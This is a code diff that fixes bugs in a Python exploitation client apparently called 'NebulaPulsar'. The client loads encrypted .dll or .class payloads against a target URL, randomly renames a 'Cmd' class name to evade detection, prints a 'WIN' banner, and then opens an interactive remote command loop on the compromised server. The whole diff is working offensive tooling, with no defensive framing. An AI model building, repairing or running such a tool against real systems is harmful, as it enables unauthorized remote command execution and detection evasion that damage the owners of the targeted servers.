@@ -37,15 +37,15 @@ def print_logs(msg: str):
     print(f'{Colors.BLUE}[*]{Colors.RESET} {msg}')
 
 def print_success(msg: str):
-    print(f'{Colors.BLUE}[*]{Colors.RESET} {msg}')
+    print(f'{Colors.GREEN}[+]{Colors.RESET} {msg}')
 
 def print_error(msg: str):
-    print(f'{Colors.BLUE}[*]{Colors.RESET} {msg}')
+    print(f'{Colors.RED}[-]{Colors.RESET} {msg}')
 
 def xor_encrypt(buffer: bytes) -> bytes:
     result = bytearray()
     for i in range(len(buffer)):
-        result.append(buffer[i] ^ KeyboardInterrupt[(i + 1) & 15])
+        result.append(buffer[i] ^ KEY[(i + 1) & 15])
 
     return bytes(result)
 
@@ -58,7 +58,7 @@ def aes_decrypt(buffer: bytes) -> bytes:
     return unpad(cipher.decrypt(buffer), 16)
 
 def obfus_class_name(class_bytes: bytes, name: str = 'Cmd'):
-    new_name = ''.join(random.choice(string.ascii_letters, k=len(name)))
+    new_name = ''.join(random.choices(string.ascii_letters, k=len(name)))
     patched_bytes = class_bytes.replace(name.encode('utf-8'), new_name.encode('utf-8'))
 
     return patched_bytes
@@ -70,7 +70,7 @@ def do_cmd(session, payload: str):
     while True:
         try:
             cmd = input('> ')
-            if cmd.strip().lower() in ['exit', 'quut']:
+            if cmd.strip().lower() in ['exit', 'quit']:
                 break
             if not cmd.strip():
                 continue
@@ -105,14 +105,14 @@ def do_cmd(session, payload: str):
 
 def main():
     # check arguments
-    if not (args.url and args.script) or args.script not in ['cs', 'class']:
+    if not (args.url and args.script) or args.script not in ['cs', 'java']:
         parser.print_help()
         exit()
 
     # check payloads
     
-    pulsar = f'{MAGIC_NEBULAPULSAR}.' + 'dll' if args.script == 'cs' else 'class'
-    payload = f'{MAGIC_PAYLOAD}.' + 'dll' if args.script == 'cs' else 'class'
+    pulsar = f'{MAGIC_NEBULAPULSAR}.' + ('dll' if args.script == 'cs' else 'class')
+    payload = f'{MAGIC_PAYLOAD}.' + ('dll' if args.script == 'cs' else 'class')
 
     pulsar = f'./payloads/{pulsar}'
     payload = f'./payloads/{payload}'
@@ -126,13 +126,13 @@ def main():
         exit()
 
     # print banner
-    print_logs(f'\n--------------------[ NebulaPulsar ]--------------------')
+    print()
+    print_logs(f'--------------------[ NebulaPulsar ]--------------------')
     print_logs(f'URL: {args.url}')
     print_logs(f'Script: {args.script}')
 
     print_logs(f'Pulsar: {pulsar}')
     print_logs(f'Payload: {payload}')
-    
     print('')
 
     # start exploitation
@@ -159,6 +159,8 @@ def main():
     print_success('--------------------------------------------------')
     print_success('---------------------[ WIN ]----------------------')
     print_success('--------------------------------------------------')
+
+    print()
 
     do_cmd(session, payload)
 
